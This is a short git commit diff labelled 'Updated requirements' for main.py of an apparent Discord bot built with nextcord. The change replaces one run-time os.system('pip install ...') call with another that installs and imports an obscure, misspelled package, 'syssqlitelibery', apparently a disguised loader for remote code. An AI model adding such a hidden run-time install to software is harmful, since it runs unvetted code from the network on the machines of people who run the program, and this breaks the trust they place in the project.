ffe4e24e8982ec517e284c98dbea3713f1b6d38b
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 14:50:19 +0000

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
